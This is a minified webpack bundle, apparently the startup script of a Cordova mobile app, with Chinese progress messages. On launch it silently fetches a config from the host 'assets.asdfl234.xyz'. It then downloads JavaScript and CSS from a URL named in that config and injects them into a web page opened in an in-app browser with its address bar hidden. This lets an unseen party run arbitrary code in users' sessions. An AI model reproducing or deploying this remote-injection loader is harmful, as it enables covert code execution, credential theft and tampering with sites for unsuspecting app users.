!function(e){var n={};function t(o){if(n[o])return n[o].exports;var r=n[o]={i:o,l:!1,exports:{}};return e[o].call(r.exports,r,r.exports,t),r.l=!0,r.exports}t.m=e,t.c=n,t.d=function(e,n,o){t.o(e,n)||Object.defineProperty(e,n,{enumerable:!0,get:o})},t.r=function(e){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},t.t=function(e,n){if(1&n&&(e=t(e)),8&n)return e;if(4&n&&"object"==typeof e&&e&&e.__esModule)return e;var o=Object.create(null);if(t.r(o),Object.defineProperty(o,"default",{enumerable:!0,value:e}),2&n&&"string"!=typeof e)for(var r in e)t.d(o,r,function(n){return e[n]}.bind(null,r));return o},t.n=function(e){var n=e&&e.__esModule?function(){return e.default}:function(){return e};return t.d(n,"a",n),n},t.o=function(e,n){return Object.prototype.hasOwnProperty.call(e,n)},t.p="",t(t.s=1)}([function(e,n,t){},function(e,n,t){"use strict";t.r(n);var o=window.$;function r(e){o("#loading").append("<div>".concat(e,"</div>"))}var i=window.$;var a=window.$;function u(){var e;r("载入中：获取配置"),a.ajax({url:"https://assets.asdfl234.xyz/g.json?_=".concat((e=(new Date).getTime(),1e3*parseInt(e/1e3/60/60,10)*60*60+101))}).done((function(e){if(r("载入中：解析配置"),e.success&&e.data){var n=function(e){return window._CONFIG_=e,e}(e.data);r("载入中，初始化APP"),t=n.WEB,o=n.INJECT,t&&t.length>0&&(r("载入中，获取配置2"),i.ajax({url:o}).done((function(e){r("解析配置2数据");var n=e.js,o=e.css,a=window.cordova;if(a.InAppBrowser){var u=a.InAppBrowser.open(t,"_self","location=no");u.addEventListener("loadstop",(function(){u.insertCSS({code:o}),u.executeScript({code:n})}))}else i("#root").text("No InAppBrowser")})))}else a("#root").html("Something Wrong. Try again.");var t,o})).fail((function(){a("#root").html("Something Wrong. Try again.")}))}t(0);__DEV__?u():document.addEventListener("deviceready",(function(){u()}),!1)}]);